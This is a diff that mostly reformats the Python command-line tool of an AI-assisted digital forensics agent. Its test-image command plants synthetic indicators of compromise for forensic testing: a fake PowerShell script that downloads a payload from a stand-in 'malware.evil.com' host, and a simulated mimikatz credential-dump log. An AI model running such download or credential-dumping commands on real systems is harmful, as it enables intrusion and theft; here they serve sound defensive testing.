@@ -11,33 +11,32 @@ Usage:
   findevil create-test-image <output>
   findevil check
 """
+
 import argparse
 import asyncio
 import json
 import logging
 import os
 import sys
-import time
-import shutil
 from datetime import datetime, timezone
 from pathlib import Path
 
 try:
-    from rich.console import Console
-    from rich.table import Table
-    from rich.panel import Panel
-    from rich.syntax import Syntax
-    from rich.markdown import Markdown
-    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
     from rich import box
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
+    from rich.syntax import Syntax
+    from rich.table import Table
     from rich.text import Text
-    from rich.style import Style
+
     RICH_AVAILABLE = True
 except ImportError:
     RICH_AVAILABLE = False
 
 try:
     import pyfiglet
+
     PYFIGLET_AVAILABLE = True
 except ImportError:
     PYFIGLET_AVAILABLE = False
@@ -51,11 +50,11 @@ logger = logging.getLogger("findevil-cli")
 
 # ── ASCII Art Engine ──────────────────────────────────────────────
 
+
 def _generate_logo() -> str:
     """Generate the FindEvil ASCII logo using pyfiglet or built-in art."""
     if PYFIGLET_AVAILABLE:
         try:
-            fonts = ["big", "block", "banner3", "ansi_shadow", "cyberlarge", "small"]
             fig = pyfiglet.Figlet(font="big")
             result = fig.renderText("FindEvil")
             if not result.strip():
@@ -66,20 +65,20 @@ def _generate_logo() -> str:
         if result and result.strip():
             return result.rstrip("\n")
     # Professional built-in ASCII art — DFIR-themed
-    return r"""                           ;                                                          
-     Et                          ED.                                                        
-     E#t          L.             E#Wi                       ,;                              
-     E##t     t   EW:        ,ft E###G.                   f#i            t              i   
-     E#W#t    Ej  E##;       t#E E#fD#W;                .E#t             Ej            LE   
-     E#tfL.   E#, E###t      t#E E#t t##L              i#W,   t      .DD.E#,          L#E   
-     E#t      E#t E#fE#f     t#E E#t  .E#K,           L#D.    EK:   ,WK. E#t         G#W.   
-  ,ffW#Dffj.  E#t E#t D#G    t#E E#t    j##f        :K#Wfff;  E#t  i#D   E#t        D#K.    
-   ;LW#ELLLf. E#t E#t  f#E.  t#E E#t    :E#K:       i##WLLLLt E#t j#f    E#t       E#K.     
-     E#t      E#t E#t   t#K: t#E E#t   t##L          .E#L     E#tL#i     E#t     .E#E.      
-     E#t      E#t E#t    ;#W,t#E E#t .D#W;             f#E:   E#WW,      E#t    .K#E        
-     E#t      E#t E#t     :K#D#E E#tiW#G.               ,WW;  E#K:       E#t   .K#D         
-     E#t      E#t E#t      .E##E E#K##i                  .D#; ED.        E#t  .W#G          
-     E#t      E#t ..         G#E E##D.                     tt t          E#t :W##########Wt 
+    return r"""                           ;
+     Et                          ED.
+     E#t          L.             E#Wi                       ,;
+     E##t     t   EW:        ,ft E###G.                   f#i            t              i
+     E#W#t    Ej  E##;       t#E E#fD#W;                .E#t             Ej            LE
+     E#tfL.   E#, E###t      t#E E#t t##L              i#W,   t      .DD.E#,          L#E
+     E#t      E#t E#fE#f     t#E E#t  .E#K,           L#D.    EK:   ,WK. E#t         G#W.
+  ,ffW#Dffj.  E#t E#t D#G    t#E E#t    j##f        :K#Wfff;  E#t  i#D   E#t        D#K.
+   ;LW#ELLLf. E#t E#t  f#E.  t#E E#t    :E#K:       i##WLLLLt E#t j#f    E#t       E#K.
+     E#t      E#t E#t   t#K: t#E E#t   t##L          .E#L     E#tL#i     E#t     .E#E.
+     E#t      E#t E#t    ;#W,t#E E#t .D#W;             f#E:   E#WW,      E#t    .K#E
+     E#t      E#t E#t     :K#D#E E#tiW#G.               ,WW;  E#K:       E#t   .K#D
+     E#t      E#t E#t      .E##E E#K##i                  .D#; ED.        E#t  .W#G
+     E#t      E#t ..         G#E E##D.                     tt t          E#t :W##########Wt
      ;#t      ,;.             fE E#t                                     ,;. :,,,,,,,,,,,,,.
       :;                       , L: """
 
@@ -150,45 +149,70 @@ def main():
         epilog="Powered by Groq AI | 21 MCP Tools | Cross-Platform",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument("--version", action="version",
-                        version=f"FindEvil Agent v{_get_version()}")
+    parser.add_argument("--version", action="version", version=f"FindEvil Agent v{_get_version()}")
     parser.add_argument("--groq-key", help="Groq API key (or set GROQ_API_KEY env var)")
-    parser.add_argument("--evidence-root", default=None,
-                        help="Evidence root directory (default: /evidence or EVIDENCE_ROOT)")
-    parser.add_argument("--results-root", default=None,
-                        help="Results root directory (default: /results or RESULTS_ROOT)")
+    parser.add_argument(
+        "--evidence-root",
+        default=None,
+        help="Evidence root directory (default: /evidence or EVIDENCE_ROOT)",
+    )
+    parser.add_argument(
+        "--results-root",
+        default=None,
+        help="Results root directory (default: /results or RESULTS_ROOT)",
+    )
     parser.add_argument("--debug", action="store_true", help="Enable debug logging")
     parser.add_argument("--no-logo", action="store_true", help="Skip ASCII logo on startup")
 
     subparsers = parser.add_subparsers(dest="command", help="Available commands")
 
     # ── investigate ──
-    inv = subparsers.add_parser("investigate", help="Run full automated DFIR investigation",
-                                description="Analyze evidence autonomously with AI-powered tool selection")
+    inv = subparsers.add_parser(
+        "investigate",
+        help="Run full automated DFIR investigation",
+        description="Analyze evidence autonomously with AI-powered tool selection",
+    )
     inv.add_argument("evidence", help="Path to evidence file (disk image, memory dump, pcap)")
-    inv.add_argument("--task", default="Investigate this evidence for signs of compromise. Find all artifacts and indicators of compromise.",
-                     help="Natural language task description for the AI")
+    inv.add_argument(
+        "--task",
+        default="Investigate this evidence for signs of compromise. Find all artifacts and indicators of compromise.",
+        help="Natural language task description for the AI",
+    )
     inv.add_argument("--output", default=None, help="Output directory for results")
-    inv.add_argument("--groq-model", default="llama-3.3-70b-versatile",
-                     help="Groq LLM model for AI analysis")
-    inv.add_argument("--no-ai", action="store_true",
-                     help="Skip AI report generation (tool results only)")
-    inv.add_argument("--phase", default=None,
-                     choices=["triage", "filesystem", "artifacts", "memory", "registry", "network", "all"],
-                     help="Run only a specific phase")
+    inv.add_argument(
+        "--groq-model", default="llama-3.3-70b-versatile", help="Groq LLM model for AI analysis"
+    )
+    inv.add_argument(
+        "--no-ai", action="store_true", help="Skip AI report generation (tool results only)"
+    )
+    inv.add_argument(
+        "--phase",
+        default=None,
+        choices=["triage", "filesystem", "artifacts", "memory", "registry", "network", "all"],
+        help="Run only a specific phase",
+    )
     inv.add_argument("--json", action="store_true", help="Output results as JSON")
 
     # ── serve ──
-    subparsers.add_parser("serve", help="Start MCP server for Claude Code / other LLM integration",
-                          description="Start the Model Context Protocol server for LLM tool integration")
+    subparsers.add_parser(
+        "serve",
+        help="Start MCP server for Claude Code / other LLM integration",
+        description="Start the Model Context Protocol server for LLM tool integration",
+    )
 
     # ── tools ──
-    subparsers.add_parser("tools", help="List all available forensic tools",
-                          description="Display all 21 registered forensic tools with descriptions")
+    subparsers.add_parser(
+        "tools",
+        help="List all available forensic tools",
+        description="Display all 21 registered forensic tools with descriptions",
+    )
 
     # ── tool ──
-    single = subparsers.add_parser("tool", help="Run a single forensic tool directly",
-                                   description="Execute one forensic tool against evidence with full control")
+    single = subparsers.add_parser(
+        "tool",
+        help="Run a single forensic tool directly",
+        description="Execute one forensic tool against evidence with full control",
+    )
     single.add_argument("tool_name", help="Name of the tool to run")
     single.add_argument("--image", help="Path to evidence image")
     single.add_argument("--inode", type=int, default=0, help="Inode number")
@@ -201,18 +225,27 @@ def main():
     single.add_argument("--json", action="store_true", help="Output as JSON")
 
     # ── create-test-image ──
-    cti = subparsers.add_parser("create-test-image", help="Create forensic test image with known artifacts",
-                                description="Generate a synthetic disk image with embedded IOCs for testing")
+    cti = subparsers.add_parser(
+        "create-test-image",
+        help="Create forensic test image with known artifacts",
+        description="Generate a synthetic disk image with embedded IOCs for testing",
+    )
     cti.add_argument("output", help="Output path for test image")
     cti.add_argument("--size", type=int, default=50, help="Size in MB (default: 50)")
 
     # ── ascii-arch ──
-    subparsers.add_parser("ascii-arch", help="Display ASCII architecture diagram",
-                          description="Print a professional ASCII art pipeline of the full DFIR analysis workflow")
+    subparsers.add_parser(
+        "ascii-arch",
+        help="Display ASCII architecture diagram",
+        description="Print a professional ASCII art pipeline of the full DFIR analysis workflow",
+    )
 
     # ── check ──
-    subparsers.add_parser("check", help="Verify all forensic tools are available",
-                          description="Check environment for required tools, Python modules, and evidence directories")
+    subparsers.add_parser(
+        "check",
+        help="Verify all forensic tools are available",
+        description="Check environment for required tools, Python modules, and evidence directories",
+    )
 
     args = parser.parse_args()
 
@@ -251,6 +284,7 @@ def _get_version() -> str:
     """Get version from pyproject.toml or fallback."""
     try:
         from importlib.metadata import version
+
         return version("findevil-agent")
     except Exception:
         return "2.1.1"
@@ -262,18 +296,22 @@ def _print_logo():
         # Create a gradient-like effect using layered styles
         logo_text = Text(LOGO, style="bold cyan")
         _print(logo_text)
-        _print(Panel.fit(
-            "[bold cyan]Autonomous DFIR Analysis Agent[/bold cyan]\n"
-            "[dim]AI-powered digital forensics  ·  21 MCP Tools  ·  Cross-Platform[/dim]",
-            border_style="cyan",
-            padding=(0, 4),
-        ))
+        _print(
+            Panel.fit(
+                "[bold cyan]Autonomous DFIR Analysis Agent[/bold cyan]\n"
+                "[dim]AI-powered digital forensics  ·  21 MCP Tools  ·  Cross-Platform[/dim]",
+                border_style="cyan",
+                padding=(0, 4),
+            )
+        )
     else:
         # ANSI-colorized fallback
         print(f"{ANSI_BOLD_CYAN}{LOGO}{ANSI_RESET}")
         print(f"{ANSI_DIM}{'─' * 60}{ANSI_RESET}")
         print(f"{ANSI_CYAN}  Autonomous DFIR Analysis Agent{ANSI_RESET}")
-        print(f"{ANSI_DIM}  AI-powered digital forensics  |  21 MCP Tools  |  Cross-Platform{ANSI_RESET}")
+        print(
+            f"{ANSI_DIM}  AI-powered digital forensics  |  21 MCP Tools  |  Cross-Platform{ANSI_RESET}"
+        )
         print(f"{ANSI_DIM}{'─' * 60}{ANSI_RESET}")
 
 
@@ -289,12 +327,14 @@ def _set_environment(args):
 #  COMMAND HANDLERS
 # ═══════════════════════════════════════════════════════════════════
 
+
 async def _cmd_investigate(args):
     """Run full automated investigation with rich progress display."""
     evidence_path = args.evidence
     output_dir = args.output or os.path.join(
         os.environ.get("RESULTS_ROOT", "/results"),
-        f"investigation_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+        f"investigation_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
+    )
 
     if not Path(evidence_path).exists():
         _print(f"[bold red]❌ Evidence not found:[/bold red] {_s(evidence_path)}")
@@ -304,15 +344,15 @@ async def _cmd_investigate(args):
     os.environ["RESULTS_ROOT"] = output_dir
 
     # Show investigation header
-    _print(f"\n[bold cyan]═══ Investigation ───[/bold cyan]")
+    _print("\n[bold cyan]═══ Investigation ───[/bold cyan]")
     _print(f"  [bold]Evidence:[/bold] {_s(evidence_path, 80)}")
     _print(f"  [bold]Output:[/bold]   {_s(output_dir, 80)}")
     _print(f"  [bold]AI:[/bold]       {'Enabled' if not args.no_ai else 'Disabled'}")
     _print(f"  [bold]Phase:[/bold]    {args.phase or 'all phases'}")
     _print()
 
-    from src.agent.loop import SimpleMCPClient, DFIRWorkflow, ToolCall
     from src.agent.groq_client import GroqDFIRClient
+    from src.agent.loop import DFIRWorkflow, SimpleMCPClient, ToolCall
 
     client = SimpleMCPClient()
     try:
@@ -357,14 +397,25 @@ async def _cmd_investigate(args):
             mapped = phase_map.get(args.phase, args.phase)
             phases_to_run = [mapped]
         else:
-            phases_to_run = ["initial_triage", "filesystem_analysis", "artifact_extraction",
-                             "memory_analysis", "registry_analysis", "network_analysis"]
+            phases_to_run = [
+                "initial_triage",
+                "filesystem_analysis",
+                "artifact_extraction",
+                "memory_analysis",
+                "registry_analysis",
+                "network_analysis",
+            ]
 
         phase_tools = {
             "initial_triage": ["list_evidence", "verify_hash", "fs_filesystem_info"],
             "filesystem_analysis": ["fs_list_files", "fs_file_metadata", "fs_extract_file"],
             "artifact_extraction": ["carve_files", "scan_yara"],
-            "memory_analysis": ["mem_list_processes", "mem_analyze", "mem_scan_network", "mem_dump_cmdline"],
+            "memory_analysis": [
+                "mem_list_processes",
+                "mem_analyze",
+                "mem_scan_network",
+                "mem_dump_cmdline",
+            ],
             "registry_analysis": ["reg_analyze_hive"],
             "network_analysis": ["pcap_analyze", "pcap_list_protocols"],
         }
@@ -393,7 +444,9 @@ async def _cmd_investigate(args):
                         workflow._extract_findings(tool, parsed)
                         _print(f"  [bold green]✅[/bold green] {tool} ({tc.duration_ms}ms)")
                     else:
-                        _print(f"  [bold yellow]⚠️[/bold yellow] {tool}: {str(parsed.get('error', 'unknown'))[:80]}")
+                        _print(
+                            f"  [bold yellow]⚠️[/bold yellow] {tool}: {str(parsed.get('error', 'unknown'))[:80]}"
+                        )
                 except Exception as e:
                     tc.error = str(e)
                     _print(f"  [bold red]❌[/bold red] {tool}: {str(e)[:80]}")
@@ -406,7 +459,7 @@ async def _cmd_investigate(args):
         # Generate AI report
         report = None
         if groq and all_findings:
-            _print(f"\n[bold]── Generating AI Report ───[/bold]")
+            _print("\n[bold]── Generating AI Report ───[/bold]")
             try:
                 findings_for_report = [f for f in all_findings if f.get("type") != "case_info"]
                 report_text = groq.generate_report(
@@ -440,13 +493,20 @@ async def _cmd_investigate(args):
 
         # Print summary
         if args.json:
-            _print(Syntax(json.dumps(results, indent=2), "json") if RICH_AVAILABLE else json.dumps(results, indent=2))
+            _print(
+                Syntax(json.dumps(results, indent=2), "json")
+                if RICH_AVAILABLE
+                else json.dumps(results, indent=2)
+            )
         else:
             s = results["summary"]
-            _print(f"\n[bold cyan]═══ Investigation Complete ═══[/bold cyan]")
-            _print(f"  [bold]Tool calls:[/bold] {s['tool_calls']} "
-                   f"([green]{s['successful_calls']}[/green] OK, [red]{s['failed_calls']}[/red] failed)" if RICH_AVAILABLE
-                   else f"  Tool calls: {s['tool_calls']} ({s['successful_calls']} OK, {s['failed_calls']} failed)")
+            _print("\n[bold cyan]═══ Investigation Complete ═══[/bold cyan]")
+            _print(
+                f"  [bold]Tool calls:[/bold] {s['tool_calls']} "
+                f"([green]{s['successful_calls']}[/green] OK, [red]{s['failed_calls']}[/red] failed)"
+                if RICH_AVAILABLE
+                else f"  Tool calls: {s['tool_calls']} ({s['successful_calls']} OK, {s['failed_calls']} failed)"
+            )
             _print(f"  [bold]Findings:[/bold]   {s['findings']}")
             _print(f"  [bold]Duration:[/bold]   {s['elapsed_seconds']}s")
             _print(f"  [bold]Output:[/bold]     {output_dir}")
@@ -455,7 +515,7 @@ async def _cmd_investigate(args):
             _print("")
 
     except KeyboardInterrupt:
-        _print(f"\n[bold yellow]⚠️ Investigation interrupted by user[/bold yellow]")
+        _print("\n[bold yellow]⚠️ Investigation interrupted by user[/bold yellow]")
     except Exception as e:
         _print(f"\n[bold red]❌ Investigation failed:[/bold red] {e}")
         raise
@@ -466,7 +526,12 @@ async def _cmd_investigate(args):
 async def _cmd_serve():
     """Start MCP server."""
     from src.server import main as server_main
-    _print(f"[bold cyan]Starting FindEvil MCP Server...[/bold cyan]" if RICH_AVAILABLE else "Starting FindEvil MCP Server...")
+
+    _print(
+        "[bold cyan]Starting FindEvil MCP Server...[/bold cyan]"
+        if RICH_AVAILABLE
+        else "Starting FindEvil MCP Server..."
+    )
     await server_main()
 
 
@@ -474,27 +539,27 @@ async def _cmd_tools():
     """List all 21 forensic tools with rich formatting."""
     # Standalone tool list (no MCP server needed)
     tools = [
-        ("🔍 fs_partition_scan",  "Scan partition table using mmls — identify disk layout"),
-        ("📂 fs_list_files",       "List files/directories via fls — explore filesystem"),
-        ("📄 fs_extract_file",     "Extract file by inode using icat — recover data"),
-        ("ℹ️  fs_file_metadata",   "Get inode metadata via istat — timestamps, permissions"),
-        ("💽 fs_filesystem_info",  "Filesystem stats via fsstat — FS type, size, layout"),
-        ("🧩 carve_files",         "Carve files by header using foremost — recover deleted"),
-        ("🧬 scan_yara",           "Scan with YARA rules — malware/pattern detection"),
-        ("🔐 verify_hash",         "Compute MD5/SHA1/SHA256 hash — integrity check"),
-        ("📋 list_evidence",       "List evidence directory contents"),
-        ("🧠 mem_analyze",         "Analyze memory with Volatility 3 — full analysis"),
+        ("🔍 fs_partition_scan", "Scan partition table using mmls — identify disk layout"),
+        ("📂 fs_list_files", "List files/directories via fls — explore filesystem"),
+        ("📄 fs_extract_file", "Extract file by inode using icat — recover data"),
+        ("ℹ️  fs_file_metadata", "Get inode metadata via istat — timestamps, permissions"),
+        ("💽 fs_filesystem_info", "Filesystem stats via fsstat — FS type, size, layout"),
+        ("🧩 carve_files", "Carve files by header using foremost — recover deleted"),
+        ("🧬 scan_yara", "Scan with YARA rules — malware/pattern detection"),
+        ("🔐 verify_hash", "Compute MD5/SHA1/SHA256 hash — integrity check"),
+        ("📋 list_evidence", "List evidence directory contents"),
+        ("🧠 mem_analyze", "Analyze memory with Volatility 3 — full analysis"),
         ("⚙️  mem_list_processes", "List processes from memory dump — pslist"),
-        ("🌐 mem_scan_network",    "Scan network connections in memory — netstat"),
-        ("📝 mem_dump_cmdline",    "Extract process command lines — bash/cmdline"),
-        ("🪟 reg_analyze_hive",    "Parse Windows Registry hive — SAM, SYSTEM, etc."),
-        ("📡 pcap_analyze",        "Analyze PCAP with tshark — protocols, conversations"),
+        ("🌐 mem_scan_network", "Scan network connections in memory — netstat"),
+        ("📝 mem_dump_cmdline", "Extract process command lines — bash/cmdline"),
+        ("🪟 reg_analyze_hive", "Parse Windows Registry hive — SAM, SYSTEM, etc."),
+        ("📡 pcap_analyze", "Analyze PCAP with tshark — protocols, conversations"),
         ("🔢 pcap_list_protocols", "List all protocols in PCAP — protocol summary"),
-        ("📅 timeline_build",      "Build forensic timeline with log2timeline/plaso"),
-        ("⏱️  timeline_filter",    "Filter/export Plaso timeline — queries, formats"),
-        ("🔎 extract_features",    "Extract emails, URLs, credit cards via bulk_extractor"),
-        ("🎯 benchmark_accuracy",  "Run accuracy benchmark against known ground truth"),
-        ("📊 get_audit_logs",      "Retrieve session audit trail — all tool calls"),
+        ("📅 timeline_build", "Build forensic timeline with log2timeline/plaso"),
+        ("⏱️  timeline_filter", "Filter/export Plaso timeline — queries, formats"),
+        ("🔎 extract_features", "Extract emails, URLs, credit cards via bulk_extractor"),
+        ("🎯 benchmark_accuracy", "Run accuracy benchmark against known ground truth"),
+        ("📊 get_audit_logs", "Retrieve session audit trail — all tool calls"),
     ]
 
     if RICH_AVAILABLE:
@@ -504,11 +569,11 @@ async def _cmd_tools():
         for name, desc in tools:
             table.add_row(name, desc)
         _print(table)
-        _print(f"\n[dim]Run: [bold]findevil tool <toolname> --image <path>[/bold] for details[/dim]")
+        _print("\n[dim]Run: [bold]findevil tool <toolname> --image <path>[/bold] for details[/dim]")
     else:
-        print(f"\n  ╔══════════════════════════════════════════════╗")
-        print(f"  ║  FindEvil — 21 Forensic Tools                ║")
-        print(f"  ╚══════════════════════════════════════════════╝\n")
+        print("\n  ╔══════════════════════════════════════════════╗")
+        print("  ║  FindEvil — 21 Forensic Tools                ║")
+        print("  ╚══════════════════════════════════════════════╝\n")
         for name, desc in tools:
             print(f"  {name}")
             print(f"     {desc}")
@@ -557,15 +622,26 @@ async def _cmd_tool(args):
         parsed = json.loads(result) if isinstance(result, str) else result
 
         if args.json:
-            _print(Syntax(json.dumps(parsed, indent=2), "json") if RICH_AVAILABLE else json.dumps(parsed, indent=2))
+            _print(
+                Syntax(json.dumps(parsed, indent=2), "json")
+                if RICH_AVAILABLE
+                else json.dumps(parsed, indent=2)
+            )
         else:
             success = parsed.get("success", False)
             status = "✅" if success else "❌"
-            _print(f"\n[bold]{status} {tool_name}[/bold]" if RICH_AVAILABLE else f"\n{status} {tool_name}")
+            _print(
+                f"\n[bold]{status} {tool_name}[/bold]"
+                if RICH_AVAILABLE
+                else f"\n{status} {tool_name}"
+            )
 
             if not success:
-                _print(f"  [bold red]Error:[/bold red] {parsed.get('error', 'Unknown error')}" if RICH_AVAILABLE
-                       else f"  Error: {parsed.get('error', 'Unknown error')}")
+                _print(
+                    f"  [bold red]Error:[/bold red] {parsed.get('error', 'Unknown error')}"
+                    if RICH_AVAILABLE
+                    else f"  Error: {parsed.get('error', 'Unknown error')}"
+                )
             else:
                 for key in ["match_count", "file_count", "packet_count", "partition_count", "hash"]:
                     if key in parsed:
@@ -581,14 +657,16 @@ def _cmd_create_test_image(args):
     output = args.output
     size_mb = args.size
 
-    _print(f"[bold]Creating test image:[/bold] {output} ({size_mb}MB)" if RICH_AVAILABLE
-           else f"Creating test image: {output} ({size_mb}MB)")
+    _print(
+        f"[bold]Creating test image:[/bold] {output} ({size_mb}MB)"
+        if RICH_AVAILABLE
+        else f"Creating test image: {output} ({size_mb}MB)"
+    )
 
     import subprocess as sp
 
     # Create empty image
-    sp.run(["dd", "if=/dev/zero", f"of={output}", "bs=1M", f"count={size_mb}"],
-           capture_output=True)
+    sp.run(["dd", "if=/dev/zero", f"of={output}", "bs=1M", f"count={size_mb}"], capture_output=True)
 
     result = sp.run(["mkfs.ext2", "-F", output], capture_output=True, text=True)
     if result.returncode != 0:
@@ -610,28 +688,40 @@ def _cmd_create_test_image(args):
         sp.run(["debugfs", "-w", "-R", cmd, output], capture_output=True)
 
     echo_cmds = [
-        ("write /dev/stdin /hello.txt",
-         "Hello from Find Evil! Test file for DFIR analysis.\n"
-         "Suspicious activity at 2026-06-01 03:14:15 UTC\n"
-         "Malicious payload: C:\\Windows\\malware.exe\n"
-         "Registry key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware\n"
-         "Network: 192.168.1.100:4444\n"),
-        ("write /dev/stdin /Users/Admin/Downloads/evil.ps1",
-         "# PowerShell payload\nInvoke-WebRequest -Uri http://malware.evil.com/payload\n"),
-        ("write /dev/stdin /Users/Admin/Downloads/mimikatz_log.txt",
-         "mimikatz: sekurlsa::logonpasswords\nAdmin:CORP:aad3b435b51404ee\n"),
-        ("write /dev/stdin /Windows/System32/config/SAM",
-         "This is a SAM registry hive (simulated)\n"),
+        (
+            "write /dev/stdin /hello.txt",
+            "Hello from Find Evil! Test file for DFIR analysis.\n"
+            "Suspicious activity at 2026-06-01 03:14:15 UTC\n"
+            "Malicious payload: C:\\Windows\\malware.exe\n"
+            "Registry key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware\n"
+            "Network: 192.168.1.100:4444\n",
+        ),
+        (
+            "write /dev/stdin /Users/Admin/Downloads/evil.ps1",
+            "# PowerShell payload\nInvoke-WebRequest -Uri http://malware.evil.com/payload\n",
+        ),
+        (
+            "write /dev/stdin /Users/Admin/Downloads/mimikatz_log.txt",
+            "mimikatz: sekurlsa::logonpasswords\nAdmin:CORP:aad3b435b51404ee\n",
+        ),
+        (
+            "write /dev/stdin /Windows/System32/config/SAM",
+            "This is a SAM registry hive (simulated)\n",
+        ),
     ]
 
     for wr_cmd, content in echo_cmds:
-        sp.run(["debugfs", "-w", "-R", wr_cmd, output],
-               input=content, capture_output=True, text=True)
+        sp.run(
+            ["debugfs", "-w", "-R", wr_cmd, output], input=content, capture_output=True, text=True
+        )
 
-    _print(f"\n[bold green]✅ Test image created:[/bold green] {output} ({size_mb}MB)" if RICH_AVAILABLE
-           else f"\n✅ Test image created: {output} ({size_mb}MB)")
-    _print(f"   Contains: hello.txt (IOCs), evil.ps1 (malicious script),")
-    _print(f"   mimikatz_log.txt (credential dump), simulated SAM hive")
+    _print(
+        f"\n[bold green]✅ Test image created:[/bold green] {output} ({size_mb}MB)"
+        if RICH_AVAILABLE
+        else f"\n✅ Test image created: {output} ({size_mb}MB)"
+    )
+    _print("   Contains: hello.txt (IOCs), evil.ps1 (malicious script),")
+    _print("   mimikatz_log.txt (credential dump), simulated SAM hive")
 
 
 def _cmd_ascii_arch():
@@ -679,15 +769,17 @@ def _cmd_ascii_arch():
 async def _cmd_check():
     """Check environment with rich formatting."""
     if RICH_AVAILABLE:
-        _print(Panel.fit(
-            "[bold cyan]FindEvil — Environment Check[/bold cyan]\n"
-            "Verifying forensic tools, Python modules, and configuration",
-            border_style="cyan",
-        ))
+        _print(
+            Panel.fit(
+                "[bold cyan]FindEvil — Environment Check[/bold cyan]\n"
+                "Verifying forensic tools, Python modules, and configuration",
+                border_style="cyan",
+            )
+        )
     else:
-        _print(f"\n🔍 FindEvil — Environment Check\n")
+        _print("\n🔍 FindEvil — Environment Check\n")
 
-    from src.tools.tool_resolver import find_tool, find_tools
+    from src.tools.tool_resolver import find_tools
 
     required_tools = {
         "fls": "TSK — file listing",
@@ -726,7 +818,7 @@ async def _cmd_check():
     for tool, desc in required_tools.items():
         path = found_tools.get(tool)
         if RICH_AVAILABLE:
-            status = f"[green]✅[/green] found" if path else f"[red]❌[/red] NOT FOUND"
+            status = "[green]✅[/green] found" if path else "[red]❌[/red] NOT FOUND"
             tool_table.add_row(tool, status, str(path or desc))
         else:
             if path:
@@ -757,7 +849,7 @@ async def _cmd_check():
                 print(f"  ✅ {mod:15s} installed ({ver})")
         except ImportError:
             if RICH_AVAILABLE:
-                mod_table.add_row(mod, f"[red]❌[/red] NOT INSTALLED", desc)
+                mod_table.add_row(mod, "[red]❌[/red] NOT INSTALLED", desc)
             else:
                 print(f"  ❌ {mod:15s} NOT INSTALLED — {desc}")
             all_ok = False
@@ -778,7 +870,7 @@ async def _cmd_check():
 
     for d in [ev_root, res_root]:
         exists = d.exists()
-        status = f"[green]✅[/green] exists" if exists else f"[yellow]⚠️[/yellow] will be created"
+        status = "[green]✅[/green] exists" if exists else "[yellow]⚠️[/yellow] will be created"
         if RICH_AVAILABLE:
             dir_table.add_row(str(d), status)
         else:
@@ -789,35 +881,44 @@ async def _cmd_check():
     # Groq key
     groq_key = os.environ.get("GROQ_API_KEY", "")
     if RICH_AVAILABLE:
-        _print(f"\n[bold]Groq API:[/bold] {'[green]✅ Set[/green]' if groq_key else '[yellow]⚠️ Not set[/yellow] — AI features disabled'}")
+        _print(
+            f"\n[bold]Groq API:[/bold] {'[green]✅ Set[/green]' if groq_key else '[yellow]⚠️ Not set[/yellow] — AI features disabled'}"
+        )
         if not groq_key:
             _print("  Get a key: [blue]https://console.groq.com[/blue]")
     else:
-        print(f"\n── Groq API Key ──")
+        print("\n── Groq API Key ──")
         if groq_key:
             print(f"  ✅ GROQ_API_KEY set ({groq_key[:20]}...)")
         else:
-            print(f"  ⚠️ GROQ_API_KEY not set — AI features disabled")
+            print("  ⚠️ GROQ_API_KEY not set — AI features disabled")
 
     # Final verdict
     _print()
     if RICH_AVAILABLE:
         if all_ok:
-            _print(Panel.fit("[bold green]✅ All systems ready for DFIR analysis![/bold green]",
-                             border_style="green"))
+            _print(
+                Panel.fit(
+                    "[bold green]✅ All systems ready for DFIR analysis![/bold green]",
+                    border_style="green",
+                )
+            )
         else:
-            _print(Panel.fit(
-                "[bold yellow]⚠️ Some tools missing[/bold yellow]\n"
-                "Install SIFT Workstation:\n"
-                "  docker pull sansdfir/sift\n"
-                "Or install individual tools via apt/brew",
-                border_style="yellow"))
+            _print(
+                Panel.fit(
+                    "[bold yellow]⚠️ Some tools missing[/bold yellow]\n"
+                    "Install SIFT Workstation:\n"
+                    "  docker pull sansdfir/sift\n"
+                    "Or install individual tools via apt/brew",
+                    border_style="yellow",
+                )
+            )
     else:
         print(f"{'=' * 50}")
         if all_ok:
-            print(f"✅ All systems ready for DFIR analysis!")
+            print("✅ All systems ready for DFIR analysis!")
         else:
-            print(f"⚠️ Some tools missing. Install SIFT Workstation for full functionality.")
+            print("⚠️ Some tools missing. Install SIFT Workstation for full functionality.")
         print(f"{'=' * 50}\n")
 
 
